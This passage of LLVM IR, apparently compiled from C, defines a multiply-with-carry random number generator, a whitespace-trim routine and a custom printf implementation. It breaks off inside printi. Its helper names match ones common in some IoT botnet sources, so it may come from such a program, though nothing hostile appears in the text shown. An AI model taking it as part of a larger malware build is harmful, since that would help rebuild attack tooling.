; Function Attrs: noinline norecurse nounwind uwtable
define i32 @rand_cmwc() local_unnamed_addr #0 {
  %1 = load i32, i32* @rand_cmwc.i, align 4
  %2 = add i32 %1, 1
  %3 = and i32 %2, 4095
  store i32 %3, i32* @rand_cmwc.i, align 4
  %4 = zext i32 %3 to i64
  %5 = getelementptr inbounds [4096 x i32], [4096 x i32]* @Q, i64 0, i64 %4
  %6 = load i32, i32* %5, align 4
  %7 = zext i32 %6 to i64
  %8 = mul nuw nsw i64 %7, 18782
  %9 = load i32, i32* @c, align 4
  %10 = zext i32 %9 to i64
  %11 = add nuw nsw i64 %8, %10
  %12 = lshr i64 %11, 32
  %13 = trunc i64 %12 to i32
  %14 = add nuw nsw i64 %12, %11
  %15 = trunc i64 %14 to i32
  %16 = icmp ult i32 %15, %13
  %17 = zext i1 %16 to i32
  %storemerge = add nuw nsw i32 %17, %13
  store i32 %storemerge, i32* @c, align 4
  %.neg7 = sext i1 %16 to i32
  %.0.neg = sub i32 -2, %15
  %18 = add i32 %.0.neg, %.neg7
  store i32 %18, i32* %5, align 4
  ret i32 %18
}

; Function Attrs: noinline nounwind uwtable
define void @trim(i8* nocapture) local_unnamed_addr #1 {
  %2 = tail call i64 @strlen(i8* %0) #14
  %3 = add i64 %2, 4294967295
  br label %4

; <label>:4:                                      ; preds = %4, %1
  %indvars.iv29 = phi i64 [ %indvars.iv.next30, %4 ], [ 0, %1 ]
  %5 = getelementptr inbounds i8, i8* %0, i64 %indvars.iv29
  %6 = load i8, i8* %5, align 1
  %7 = sext i8 %6 to i32
  %8 = tail call i32 @isspace(i32 %7) #14
  %9 = icmp eq i32 %8, 0
  %indvars.iv.next30 = add nuw i64 %indvars.iv29, 1
  br i1 %9, label %.preheader, label %4

.preheader:                                       ; preds = %4
  %10 = trunc i64 %3 to i32
  %11 = trunc i64 %indvars.iv29 to i32
  %12 = icmp slt i32 %10, %11
  br i1 %12, label %.critedge.preheader, label %.lr.ph22.preheader

.lr.ph22.preheader:                               ; preds = %.preheader
  %sext = shl i64 %3, 32
  %13 = ashr exact i64 %sext, 32
  %sext31 = shl i64 %indvars.iv29, 32
  %14 = ashr exact i64 %sext31, 32
  br label %.lr.ph22

.critedge.preheader.loopexit:                     ; preds = %.lr.ph22, %80
  %.0.lcssa.ph = phi i32 [ %79, %.lr.ph22 ], [ %81, %80 ]
  br label %.critedge.preheader

.critedge.preheader:                              ; preds = %.critedge.preheader.loopexit, %.preheader
  %.0.lcssa = phi i32 [ %10, %.preheader ], [ %.0.lcssa.ph, %.critedge.preheader.loopexit ]
  %15 = icmp sgt i32 %11, %.0.lcssa
  br i1 %15, label %.critedge._crit_edge, label %.critedge.preheader26

.critedge.preheader26:                            ; preds = %.critedge.preheader
  %sext32 = shl i64 %indvars.iv29, 32
  %16 = ashr exact i64 %sext32, 32
  %17 = sext i32 %.0.lcssa to i64
  %18 = icmp sgt i64 %17, %16
  %smax = select i1 %18, i64 %17, i64 %16
  %19 = add nsw i64 %smax, 1
  %20 = sub nsw i64 %19, %16
  %min.iters.check = icmp ult i64 %20, 32
  br i1 %min.iters.check, label %.critedge.preheader39, label %min.iters.checked

.critedge.preheader39:                            ; preds = %middle.block, %vector.memcheck, %min.iters.checked, %.critedge.preheader26
  %indvars.iv.ph = phi i64 [ %16, %vector.memcheck ], [ %16, %min.iters.checked ], [ %16, %.critedge.preheader26 ], [ %ind.end, %middle.block ]
  br label %.critedge

min.iters.checked:                                ; preds = %.critedge.preheader26
  %n.vec = and i64 %20, -32
  %cmp.zero = icmp eq i64 %n.vec, 0
  br i1 %cmp.zero, label %.critedge.preheader39, label %vector.memcheck

vector.memcheck:                                  ; preds = %min.iters.checked
  %21 = icmp sgt i64 %17, %16
  %smax34 = select i1 %21, i64 %17, i64 %16
  %22 = add nsw i64 %smax34, 1
  %23 = sub nsw i64 %22, %16
  %scevgep = getelementptr i8, i8* %0, i64 %23
  %scevgep35 = getelementptr i8, i8* %0, i64 %16
  %scevgep36 = getelementptr i8, i8* %0, i64 %22
  %bound0 = icmp ugt i8* %scevgep36, %0
  %bound1 = icmp ult i8* %scevgep35, %scevgep
  %memcheck.conflict = and i1 %bound0, %bound1
  %ind.end = add nsw i64 %16, %n.vec
  br i1 %memcheck.conflict, label %.critedge.preheader39, label %vector.body.preheader

vector.body.preheader:                            ; preds = %vector.memcheck
  %24 = add nsw i64 %n.vec, -32
  %25 = lshr exact i64 %24, 5
  %26 = add nuw nsw i64 %25, 1
  %xtraiter = and i64 %26, 3
  %lcmp.mod = icmp eq i64 %xtraiter, 0
  br i1 %lcmp.mod, label %vector.body.prol.loopexit, label %vector.body.prol.preheader

vector.body.prol.preheader:                       ; preds = %vector.body.preheader
  br label %vector.body.prol

vector.body.prol:                                 ; preds = %vector.body.prol, %vector.body.prol.preheader
  %index.prol = phi i64 [ %index.next.prol, %vector.body.prol ], [ 0, %vector.body.prol.preheader ]
  %prol.iter = phi i64 [ %prol.iter.sub, %vector.body.prol ], [ %xtraiter, %vector.body.prol.preheader ]
  %27 = add i64 %16, %index.prol
  %28 = getelementptr inbounds i8, i8* %0, i64 %27
  %29 = bitcast i8* %28 to <16 x i8>*
  %wide.load.prol = load <16 x i8>, <16 x i8>* %29, align 1, !alias.scope !4
  %30 = getelementptr i8, i8* %28, i64 16
  %31 = bitcast i8* %30 to <16 x i8>*
  %wide.load38.prol = load <16 x i8>, <16 x i8>* %31, align 1, !alias.scope !4
  %32 = getelementptr inbounds i8, i8* %0, i64 %index.prol
  %33 = bitcast i8* %32 to <16 x i8>*
  store <16 x i8> %wide.load.prol, <16 x i8>* %33, align 1, !alias.scope !7, !noalias !4
  %34 = getelementptr i8, i8* %32, i64 16
  %35 = bitcast i8* %34 to <16 x i8>*
  store <16 x i8> %wide.load38.prol, <16 x i8>* %35, align 1, !alias.scope !7, !noalias !4
  %index.next.prol = add i64 %index.prol, 32
  %prol.iter.sub = add i64 %prol.iter, -1
  %prol.iter.cmp = icmp eq i64 %prol.iter.sub, 0
  br i1 %prol.iter.cmp, label %vector.body.prol.loopexit.unr-lcssa, label %vector.body.prol, !llvm.loop !9

vector.body.prol.loopexit.unr-lcssa:              ; preds = %vector.body.prol
  br label %vector.body.prol.loopexit

vector.body.prol.loopexit:                        ; preds = %vector.body.preheader, %vector.body.prol.loopexit.unr-lcssa
  %index.unr = phi i64 [ 0, %vector.body.preheader ], [ %index.next.prol, %vector.body.prol.loopexit.unr-lcssa ]
  %36 = icmp ult i64 %24, 96
  br i1 %36, label %middle.block, label %vector.body.preheader.new

vector.body.preheader.new:                        ; preds = %vector.body.prol.loopexit
  br label %vector.body

vector.body:                                      ; preds = %vector.body, %vector.body.preheader.new
  %index = phi i64 [ %index.unr, %vector.body.preheader.new ], [ %index.next.3, %vector.body ]
  %37 = add i64 %16, %index
  %38 = getelementptr inbounds i8, i8* %0, i64 %37
  %39 = bitcast i8* %38 to <16 x i8>*
  %wide.load = load <16 x i8>, <16 x i8>* %39, align 1, !alias.scope !4
  %40 = getelementptr i8, i8* %38, i64 16
  %41 = bitcast i8* %40 to <16 x i8>*
  %wide.load38 = load <16 x i8>, <16 x i8>* %41, align 1, !alias.scope !4
  %42 = getelementptr inbounds i8, i8* %0, i64 %index
  %43 = bitcast i8* %42 to <16 x i8>*
  store <16 x i8> %wide.load, <16 x i8>* %43, align 1, !alias.scope !7, !noalias !4
  %44 = getelementptr i8, i8* %42, i64 16
  %45 = bitcast i8* %44 to <16 x i8>*
  store <16 x i8> %wide.load38, <16 x i8>* %45, align 1, !alias.scope !7, !noalias !4
  %index.next = add i64 %index, 32
  %46 = add i64 %16, %index.next
  %47 = getelementptr inbounds i8, i8* %0, i64 %46
  %48 = bitcast i8* %47 to <16 x i8>*
  %wide.load.1 = load <16 x i8>, <16 x i8>* %48, align 1, !alias.scope !4
  %49 = getelementptr i8, i8* %47, i64 16
  %50 = bitcast i8* %49 to <16 x i8>*
  %wide.load38.1 = load <16 x i8>, <16 x i8>* %50, align 1, !alias.scope !4
  %51 = getelementptr inbounds i8, i8* %0, i64 %index.next
  %52 = bitcast i8* %51 to <16 x i8>*
  store <16 x i8> %wide.load.1, <16 x i8>* %52, align 1, !alias.scope !7, !noalias !4
  %53 = getelementptr i8, i8* %51, i64 16
  %54 = bitcast i8* %53 to <16 x i8>*
  store <16 x i8> %wide.load38.1, <16 x i8>* %54, align 1, !alias.scope !7, !noalias !4
  %index.next.1 = add i64 %index, 64
  %55 = add i64 %16, %index.next.1
  %56 = getelementptr inbounds i8, i8* %0, i64 %55
  %57 = bitcast i8* %56 to <16 x i8>*
  %wide.load.2 = load <16 x i8>, <16 x i8>* %57, align 1, !alias.scope !4
  %58 = getelementptr i8, i8* %56, i64 16
  %59 = bitcast i8* %58 to <16 x i8>*
  %wide.load38.2 = load <16 x i8>, <16 x i8>* %59, align 1, !alias.scope !4
  %60 = getelementptr inbounds i8, i8* %0, i64 %index.next.1
  %61 = bitcast i8* %60 to <16 x i8>*
  store <16 x i8> %wide.load.2, <16 x i8>* %61, align 1, !alias.scope !7, !noalias !4
  %62 = getelementptr i8, i8* %60, i64 16
  %63 = bitcast i8* %62 to <16 x i8>*
  store <16 x i8> %wide.load38.2, <16 x i8>* %63, align 1, !alias.scope !7, !noalias !4
  %index.next.2 = add i64 %index, 96
  %64 = add i64 %16, %index.next.2
  %65 = getelementptr inbounds i8, i8* %0, i64 %64
  %66 = bitcast i8* %65 to <16 x i8>*
  %wide.load.3 = load <16 x i8>, <16 x i8>* %66, align 1, !alias.scope !4
  %67 = getelementptr i8, i8* %65, i64 16
  %68 = bitcast i8* %67 to <16 x i8>*
  %wide.load38.3 = load <16 x i8>, <16 x i8>* %68, align 1, !alias.scope !4
  %69 = getelementptr inbounds i8, i8* %0, i64 %index.next.2
  %70 = bitcast i8* %69 to <16 x i8>*
  store <16 x i8> %wide.load.3, <16 x i8>* %70, align 1, !alias.scope !7, !noalias !4
  %71 = getelementptr i8, i8* %69, i64 16
  %72 = bitcast i8* %71 to <16 x i8>*
  store <16 x i8> %wide.load38.3, <16 x i8>* %72, align 1, !alias.scope !7, !noalias !4
  %index.next.3 = add i64 %index, 128
  %73 = icmp eq i64 %index.next.3, %n.vec
  br i1 %73, label %middle.block.unr-lcssa, label %vector.body, !llvm.loop !11

middle.block.unr-lcssa:                           ; preds = %vector.body
  br label %middle.block

middle.block:                                     ; preds = %vector.body.prol.loopexit, %middle.block.unr-lcssa
  %cmp.n = icmp eq i64 %20, %n.vec
  br i1 %cmp.n, label %.critedge._crit_edge, label %.critedge.preheader39

.lr.ph22:                                         ; preds = %.lr.ph22.preheader, %80
  %indvars.iv27 = phi i64 [ %13, %.lr.ph22.preheader ], [ %indvars.iv.next28, %80 ]
  %.021 = phi i32 [ %10, %.lr.ph22.preheader ], [ %81, %80 ]
  %74 = getelementptr inbounds i8, i8* %0, i64 %indvars.iv27
  %75 = load i8, i8* %74, align 1
  %76 = sext i8 %75 to i32
  %77 = tail call i32 @isspace(i32 %76) #14
  %78 = icmp eq i32 %77, 0
  %79 = trunc i64 %indvars.iv27 to i32
  br i1 %78, label %.critedge.preheader.loopexit, label %80

; <label>:80:                                     ; preds = %.lr.ph22
  %indvars.iv.next28 = add nsw i64 %indvars.iv27, -1
  %81 = add nsw i32 %.021, -1
  %82 = icmp sgt i64 %indvars.iv27, %14
  br i1 %82, label %.lr.ph22, label %.critedge.preheader.loopexit

.critedge:                                        ; preds = %.critedge.preheader39, %.critedge
  %indvars.iv = phi i64 [ %indvars.iv.next, %.critedge ], [ %indvars.iv.ph, %.critedge.preheader39 ]
  %83 = getelementptr inbounds i8, i8* %0, i64 %indvars.iv
  %84 = load i8, i8* %83, align 1
  %85 = sub nsw i64 %indvars.iv, %16
  %86 = getelementptr inbounds i8, i8* %0, i64 %85
  store i8 %84, i8* %86, align 1
  %indvars.iv.next = add nsw i64 %indvars.iv, 1
  %87 = icmp slt i64 %indvars.iv, %17
  br i1 %87, label %.critedge, label %.critedge._crit_edge.loopexit, !llvm.loop !12

.critedge._crit_edge.loopexit:                    ; preds = %.critedge
  br label %.critedge._crit_edge

.critedge._crit_edge:                             ; preds = %.critedge._crit_edge.loopexit, %middle.block, %.critedge.preheader
  %.019.lcssa = phi i64 [ %indvars.iv29, %.critedge.preheader ], [ %ind.end, %middle.block ], [ %indvars.iv.next, %.critedge._crit_edge.loopexit ]
  %88 = sub i64 %.019.lcssa, %indvars.iv29
  %sext33 = shl i64 %88, 32
  %89 = ashr exact i64 %sext33, 32
  %90 = getelementptr inbounds i8, i8* %0, i64 %89
  store i8 0, i8* %90, align 1
  ret void
}

; Function Attrs: nounwind readonly
declare i64 @strlen(i8* nocapture) local_unnamed_addr #2

; Function Attrs: nounwind readonly
declare i32 @isspace(i32) local_unnamed_addr #2

; Function Attrs: noinline nounwind uwtable
define i32 @zprintf(i8* nocapture readonly, ...) local_unnamed_addr #1 {
  %2 = alloca [1 x %struct.__va_list_tag], align 16
  %3 = getelementptr inbounds [1 x %struct.__va_list_tag], [1 x %struct.__va_list_tag]* %2, i64 0, i64 0
  %4 = bitcast [1 x %struct.__va_list_tag]* %2 to i8*
  call void @llvm.va_start(i8* nonnull %4)
  %5 = call fastcc i32 @print(i8** null, i8* %0, %struct.__va_list_tag* nonnull %3)
  ret i32 %5
}

; Function Attrs: nounwind
declare void @llvm.va_start(i8*) #3

; Function Attrs: noinline nounwind uwtable
define internal fastcc i32 @print(i8**, i8* nocapture readonly, %struct.__va_list_tag*) unnamed_addr #1 {
  %4 = alloca [2 x i8], align 1
  %5 = getelementptr inbounds %struct.__va_list_tag, %struct.__va_list_tag* %2, i64 0, i32 0
  %6 = getelementptr inbounds %struct.__va_list_tag, %struct.__va_list_tag* %2, i64 0, i32 3
  %7 = getelementptr inbounds %struct.__va_list_tag, %struct.__va_list_tag* %2, i64 0, i32 2
  %8 = getelementptr inbounds [2 x i8], [2 x i8]* %4, i64 0, i64 0
  %9 = getelementptr inbounds [2 x i8], [2 x i8]* %4, i64 0, i64 1
  br label %10

; <label>:10:                                     ; preds = %136, %3
  %.061 = phi i32 [ 0, %3 ], [ %.162, %136 ]
  %.0 = phi i8* [ %1, %3 ], [ %137, %136 ]
  %11 = load i8, i8* %.0, align 1
  switch i8 %11, label %132 [
    i8 0, label %138
    i8 37, label %12
  ]

; <label>:12:                                     ; preds = %10
  %13 = getelementptr inbounds i8, i8* %.0, i64 1
  %14 = load i8, i8* %13, align 1
  switch i8 %14, label %.preheader70 [
    i8 0, label %138
    i8 37, label %132
    i8 45, label %15
  ]

; <label>:15:                                     ; preds = %12
  %16 = getelementptr inbounds i8, i8* %.0, i64 2
  %.pre = load i8, i8* %16, align 1
  br label %.preheader70

.preheader70:                                     ; preds = %15, %12
  %17 = phi i8 [ %14, %12 ], [ %.pre, %15 ]
  %.063.ph = phi i32 [ 0, %12 ], [ 1, %15 ]
  %.1.ph = phi i8* [ %13, %12 ], [ %16, %15 ]
  %18 = icmp eq i8 %17, 48
  br i1 %18, label %.lr.ph.preheader, label %.preheader

.lr.ph.preheader:                                 ; preds = %.preheader70
  br label %.lr.ph

.preheader.loopexit:                              ; preds = %.lr.ph
  br label %.preheader

.preheader:                                       ; preds = %.preheader.loopexit, %.preheader70
  %19 = phi i8 [ %17, %.preheader70 ], [ %23, %.preheader.loopexit ]
  %.063.lcssa = phi i32 [ %.063.ph, %.preheader70 ], [ %22, %.preheader.loopexit ]
  %.1.lcssa = phi i8* [ %.1.ph, %.preheader70 ], [ %21, %.preheader.loopexit ]
  %.off74 = add i8 %19, -48
  %20 = icmp ult i8 %.off74, 10
  br i1 %20, label %.lr.ph77.preheader, label %.critedge

.lr.ph77.preheader:                               ; preds = %.preheader
  br label %.lr.ph77

.lr.ph:                                           ; preds = %.lr.ph.preheader, %.lr.ph
  %.172 = phi i8* [ %21, %.lr.ph ], [ %.1.ph, %.lr.ph.preheader ]
  %.06371 = phi i32 [ %22, %.lr.ph ], [ %.063.ph, %.lr.ph.preheader ]
  %21 = getelementptr inbounds i8, i8* %.172, i64 1
  %22 = or i32 %.06371, 2
  %23 = load i8, i8* %21, align 1
  %24 = icmp eq i8 %23, 48
  br i1 %24, label %.lr.ph, label %.preheader.loopexit

.lr.ph77:                                         ; preds = %.lr.ph77.preheader, %.lr.ph77
  %25 = phi i8 [ %31, %.lr.ph77 ], [ %19, %.lr.ph77.preheader ]
  %.276 = phi i8* [ %30, %.lr.ph77 ], [ %.1.lcssa, %.lr.ph77.preheader ]
  %.06475 = phi i32 [ %29, %.lr.ph77 ], [ 0, %.lr.ph77.preheader ]
  %26 = zext i8 %25 to i32
  %27 = mul nsw i32 %.06475, 10
  %28 = add i32 %27, -48
  %29 = add i32 %28, %26
  %30 = getelementptr inbounds i8, i8* %.276, i64 1
  %31 = load i8, i8* %30, align 1
  %.off = add i8 %31, -48
  %32 = icmp ult i8 %.off, 10
  br i1 %32, label %.lr.ph77, label %.critedge.loopexit

.critedge.loopexit:                               ; preds = %.lr.ph77
  br label %.critedge

.critedge:                                        ; preds = %.critedge.loopexit, %.preheader
  %.064.lcssa = phi i32 [ 0, %.preheader ], [ %29, %.critedge.loopexit ]
  %.2.lcssa = phi i8* [ %.1.lcssa, %.preheader ], [ %30, %.critedge.loopexit ]
  %.lcssa = phi i8 [ %19, %.preheader ], [ %31, %.critedge.loopexit ]
  switch i8 %.lcssa, label %136 [
    i8 115, label %33
    i8 100, label %51
    i8 120, label %67
    i8 88, label %83
    i8 117, label %99
    i8 99, label %115
  ]

; <label>:33:                                     ; preds = %.critedge
  %34 = load i32, i32* %5, align 8
  %35 = icmp ult i32 %34, 41
  br i1 %35, label %36, label %41

; <label>:36:                                     ; preds = %33
  %37 = load i8*, i8** %6, align 8
  %38 = sext i32 %34 to i64
  %39 = getelementptr i8, i8* %37, i64 %38
  %40 = add i32 %34, 8
  store i32 %40, i32* %5, align 8
  br label %44

; <label>:41:                                     ; preds = %33
  %42 = load i8*, i8** %7, align 8
  %43 = getelementptr i8, i8* %42, i64 8
  store i8* %43, i8** %7, align 8
  br label %44

; <label>:44:                                     ; preds = %41, %36
  %.in69 = phi i8* [ %39, %36 ], [ %42, %41 ]
  %45 = bitcast i8* %.in69 to i8**
  %46 = load i8*, i8** %45, align 8
  %47 = icmp ne i8* %46, null
  %48 = select i1 %47, i8* %46, i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.117, i64 0, i64 0)
  %49 = tail call fastcc i32 @prints(i8** %0, i8* %48, i32 %.064.lcssa, i32 %.063.lcssa)
  %50 = add nsw i32 %49, %.061
  br label %136

; <label>:51:                                     ; preds = %.critedge
  %52 = load i32, i32* %5, align 8
  %53 = icmp ult i32 %52, 41
  br i1 %53, label %54, label %59

; <label>:54:                                     ; preds = %51
  %55 = load i8*, i8** %6, align 8
  %56 = sext i32 %52 to i64
  %57 = getelementptr i8, i8* %55, i64 %56
  %58 = add i32 %52, 8
  store i32 %58, i32* %5, align 8
  br label %62

; <label>:59:                                     ; preds = %51
  %60 = load i8*, i8** %7, align 8
  %61 = getelementptr i8, i8* %60, i64 8
  store i8* %61, i8** %7, align 8
  br label %62

; <label>:62:                                     ; preds = %59, %54
  %.in68 = phi i8* [ %57, %54 ], [ %60, %59 ]
  %63 = bitcast i8* %.in68 to i32*
  %64 = load i32, i32* %63, align 4
  %65 = tail call fastcc i32 @printi(i8** %0, i32 %64, i32 10, i32 1, i32 %.064.lcssa, i32 %.063.lcssa, i32 97)
  %66 = add nsw i32 %65, %.061
  br label %136

; <label>:67:                                     ; preds = %.critedge
  %68 = load i32, i32* %5, align 8
  %69 = icmp ult i32 %68, 41
  br i1 %69, label %70, label %75

; <label>:70:                                     ; preds = %67
  %71 = load i8*, i8** %6, align 8
  %72 = sext i32 %68 to i64
  %73 = getelementptr i8, i8* %71, i64 %72
  %74 = add i32 %68, 8
  store i32 %74, i32* %5, align 8
  br label %78

; <label>:75:                                     ; preds = %67
  %76 = load i8*, i8** %7, align 8
  %77 = getelementptr i8, i8* %76, i64 8
  store i8* %77, i8** %7, align 8
  br label %78

; <label>:78:                                     ; preds = %75, %70
  %.in67 = phi i8* [ %73, %70 ], [ %76, %75 ]
  %79 = bitcast i8* %.in67 to i32*
  %80 = load i32, i32* %79, align 4
  %81 = tail call fastcc i32 @printi(i8** %0, i32 %80, i32 16, i32 0, i32 %.064.lcssa, i32 %.063.lcssa, i32 97)
  %82 = add nsw i32 %81, %.061
  br label %136

; <label>:83:                                     ; preds = %.critedge
  %84 = load i32, i32* %5, align 8
  %85 = icmp ult i32 %84, 41
  br i1 %85, label %86, label %91

; <label>:86:                                     ; preds = %83
  %87 = load i8*, i8** %6, align 8
  %88 = sext i32 %84 to i64
  %89 = getelementptr i8, i8* %87, i64 %88
  %90 = add i32 %84, 8
  store i32 %90, i32* %5, align 8
  br label %94

; <label>:91:                                     ; preds = %83
  %92 = load i8*, i8** %7, align 8
  %93 = getelementptr i8, i8* %92, i64 8
  store i8* %93, i8** %7, align 8
  br label %94

; <label>:94:                                     ; preds = %91, %86
  %.in66 = phi i8* [ %89, %86 ], [ %92, %91 ]
  %95 = bitcast i8* %.in66 to i32*
  %96 = load i32, i32* %95, align 4
  %97 = tail call fastcc i32 @printi(i8** %0, i32 %96, i32 16, i32 0, i32 %.064.lcssa, i32 %.063.lcssa, i32 65)
  %98 = add nsw i32 %97, %.061
  br label %136

; <label>:99:                                     ; preds = %.critedge
  %100 = load i32, i32* %5, align 8
  %101 = icmp ult i32 %100, 41
  br i1 %101, label %102, label %107

; <label>:102:                                    ; preds = %99
  %103 = load i8*, i8** %6, align 8
  %104 = sext i32 %100 to i64
  %105 = getelementptr i8, i8* %103, i64 %104
  %106 = add i32 %100, 8
  store i32 %106, i32* %5, align 8
  br label %110

; <label>:107:                                    ; preds = %99
  %108 = load i8*, i8** %7, align 8
  %109 = getelementptr i8, i8* %108, i64 8
  store i8* %109, i8** %7, align 8
  br label %110

; <label>:110:                                    ; preds = %107, %102
  %.in65 = phi i8* [ %105, %102 ], [ %108, %107 ]
  %111 = bitcast i8* %.in65 to i32*
  %112 = load i32, i32* %111, align 4
  %113 = tail call fastcc i32 @printi(i8** %0, i32 %112, i32 10, i32 0, i32 %.064.lcssa, i32 %.063.lcssa, i32 97)
  %114 = add nsw i32 %113, %.061
  br label %136

; <label>:115:                                    ; preds = %.critedge
  %116 = load i32, i32* %5, align 8
  %117 = icmp ult i32 %116, 41
  br i1 %117, label %118, label %123

; <label>:118:                                    ; preds = %115
  %119 = load i8*, i8** %6, align 8
  %120 = sext i32 %116 to i64
  %121 = getelementptr i8, i8* %119, i64 %120
  %122 = add i32 %116, 8
  store i32 %122, i32* %5, align 8
  br label %126

; <label>:123:                                    ; preds = %115
  %124 = load i8*, i8** %7, align 8
  %125 = getelementptr i8, i8* %124, i64 8
  store i8* %125, i8** %7, align 8
  br label %126

; <label>:126:                                    ; preds = %123, %118
  %.in = phi i8* [ %121, %118 ], [ %124, %123 ]
  %127 = bitcast i8* %.in to i32*
  %128 = load i32, i32* %127, align 4
  %129 = trunc i32 %128 to i8
  store i8 %129, i8* %8, align 1
  store i8 0, i8* %9, align 1
  %130 = call fastcc i32 @prints(i8** %0, i8* nonnull %8, i32 %.064.lcssa, i32 %.063.lcssa)
  %131 = add nsw i32 %130, %.061
  br label %136

; <label>:132:                                    ; preds = %12, %10
  %133 = phi i8 [ %11, %10 ], [ 37, %12 ]
  %.3 = phi i8* [ %.0, %10 ], [ %13, %12 ]
  %134 = zext i8 %133 to i32
  tail call fastcc void @printchar(i8** %0, i32 %134)
  %135 = add nsw i32 %.061, 1
  br label %136

; <label>:136:                                    ; preds = %.critedge, %132, %126, %110, %94, %78, %62, %44
  %.162 = phi i32 [ %135, %132 ], [ %50, %44 ], [ %66, %62 ], [ %82, %78 ], [ %98, %94 ], [ %114, %110 ], [ %131, %126 ], [ %.061, %.critedge ]
  %.4 = phi i8* [ %.3, %132 ], [ %.2.lcssa, %44 ], [ %.2.lcssa, %62 ], [ %.2.lcssa, %78 ], [ %.2.lcssa, %94 ], [ %.2.lcssa, %110 ], [ %.2.lcssa, %126 ], [ %.2.lcssa, %.critedge ]
  %137 = getelementptr inbounds i8, i8* %.4, i64 1
  br label %10

; <label>:138:                                    ; preds = %12, %10
  %139 = icmp eq i8** %0, null
  br i1 %139, label %142, label %140

; <label>:140:                                    ; preds = %138
  %141 = load i8*, i8** %0, align 8
  store i8 0, i8* %141, align 1
  br label %142

; <label>:142:                                    ; preds = %138, %140
  %143 = bitcast %struct.__va_list_tag* %2 to i8*
  tail call void @llvm.va_end(i8* %143)
  ret i32 %.061
}

; Function Attrs: noinline nounwind uwtable
define internal fastcc i32 @prints(i8**, i8* nocapture readonly, i32, i32) unnamed_addr #1 {
  %5 = icmp sgt i32 %2, 0
  br i1 %5, label %.preheader37, label %.thread.preheader

.preheader37:                                     ; preds = %4
  %6 = load i8, i8* %1, align 1
  %7 = icmp eq i8 %6, 0
  br i1 %7, label %._crit_edge48, label %.lr.ph47.preheader

.lr.ph47.preheader:                               ; preds = %.preheader37
  br label %.lr.ph47

.lr.ph47:                                         ; preds = %.lr.ph47.preheader, %.lr.ph47
  %.046 = phi i8* [ %9, %.lr.ph47 ], [ %1, %.lr.ph47.preheader ]
  %.02745 = phi i32 [ %8, %.lr.ph47 ], [ 0, %.lr.ph47.preheader ]
  %8 = add nuw nsw i32 %.02745, 1
  %9 = getelementptr inbounds i8, i8* %.046, i64 1
  %10 = load i8, i8* %9, align 1
  %11 = icmp eq i8 %10, 0
  br i1 %11, label %._crit_edge48.loopexit, label %.lr.ph47

._crit_edge48.loopexit:                           ; preds = %.lr.ph47
  br label %._crit_edge48

._crit_edge48:                                    ; preds = %._crit_edge48.loopexit, %.preheader37
  %.027.lcssa = phi i32 [ 0, %.preheader37 ], [ %8, %._crit_edge48.loopexit ]
  %12 = icmp slt i32 %.027.lcssa, %2
  %13 = sub nsw i32 %2, %.027.lcssa
  %.031 = select i1 %12, i32 %13, i32 0
  %14 = shl i32 %3, 3
  %15 = and i32 %14, 16
  %16 = or i32 %15, 32
  %17 = and i32 %3, 1
  %18 = icmp eq i32 %17, 0
  %19 = icmp sgt i32 %.031, 0
  %or.cond = and i1 %18, %19
  br i1 %or.cond, label %.preheader36.preheader, label %.thread.preheader

.preheader36.preheader:                           ; preds = %._crit_edge48
  br label %.preheader36

.preheader36:                                     ; preds = %.preheader36.preheader, %.preheader36
  %.233 = phi i32 [ %21, %.preheader36 ], [ %13, %.preheader36.preheader ]
  %.029 = phi i32 [ %20, %.preheader36 ], [ 0, %.preheader36.preheader ]
  tail call fastcc void @printchar(i8** %0, i32 %16)
  %20 = add nuw nsw i32 %.029, 1
  %21 = add nsw i32 %.233, -1
  %.old1 = icmp sgt i32 %.233, 1
  br i1 %.old1, label %.preheader36, label %.thread.preheader.loopexit

.thread.preheader.loopexit:                       ; preds = %.preheader36
  br label %.thread.preheader

.thread.preheader:                                ; preds = %.thread.preheader.loopexit, %._crit_edge48, %4
  %.02835.ph = phi i32 [ 32, %4 ], [ %16, %._crit_edge48 ], [ %16, %.thread.preheader.loopexit ]
  %.3.ph = phi i32 [ %2, %4 ], [ %.031, %._crit_edge48 ], [ %21, %.thread.preheader.loopexit ]
  %.1.ph = phi i32 [ 0, %4 ], [ 0, %._crit_edge48 ], [ %20, %.thread.preheader.loopexit ]
  %22 = load i8, i8* %1, align 1
  %23 = icmp eq i8 %22, 0
  br i1 %23, label %.preheader, label %.thread.preheader65

.thread.preheader65:                              ; preds = %.thread.preheader
  br label %.thread

.preheader.loopexit:                              ; preds = %.thread
  br label %.preheader

.preheader:                                       ; preds = %.preheader.loopexit, %.thread.preheader
  %.1.lcssa = phi i32 [ %.1.ph, %.thread.preheader ], [ %27, %.preheader.loopexit ]
  %24 = icmp sgt i32 %.3.ph, 0
  br i1 %24, label %.lr.ph.preheader, label %._crit_edge

.lr.ph.preheader:                                 ; preds = %.preheader
  br label %.lr.ph

.thread:                                          ; preds = %.thread.preheader65, %.thread
  %25 = phi i8 [ %29, %.thread ], [ %22, %.thread.preheader65 ]
  %.142 = phi i32 [ %27, %.thread ], [ %.1.ph, %.thread.preheader65 ]
  %.03041 = phi i8* [ %28, %.thread ], [ %1, %.thread.preheader65 ]
  %26 = zext i8 %25 to i32
  tail call fastcc void @printchar(i8** %0, i32 %26)
  %27 = add nsw i32 %.142, 1
  %28 = getelementptr inbounds i8, i8* %.03041, i64 1
  %29 = load i8, i8* %28, align 1
  %30 = icmp eq i8 %29, 0
  br i1 %30, label %.preheader.loopexit, label %.thread

.lr.ph:                                           ; preds = %.lr.ph.preheader, %.lr.ph
  %.240 = phi i32 [ %31, %.lr.ph ], [ %.1.lcssa, %.lr.ph.preheader ]
  %.439 = phi i32 [ %32, %.lr.ph ], [ %.3.ph, %.lr.ph.preheader ]
  tail call fastcc void @printchar(i8** %0, i32 %.02835.ph)
  %31 = add nsw i32 %.240, 1
  %32 = add nsw i32 %.439, -1
  %33 = icmp sgt i32 %.439, 1
  br i1 %33, label %.lr.ph, label %._crit_edge.loopexit

._crit_edge.loopexit:                             ; preds = %.lr.ph
  br label %._crit_edge

._crit_edge:                                      ; preds = %._crit_edge.loopexit, %.preheader
  %.2.lcssa = phi i32 [ %.1.lcssa, %.preheader ], [ %31, %._crit_edge.loopexit ]
  ret i32 %.2.lcssa
}

; Function Attrs: noinline nounwind uwtable
define internal fastcc i32 @printi(i8**, i32, i32, i32, i32, i32, i32) unnamed_addr #1 {
  %8 = alloca [12 x i8], align 1
  %9 = icmp eq i32 %1, 0
  br i1 %9, label %10, label %14

; <label>:10:                                     ; preds = %7
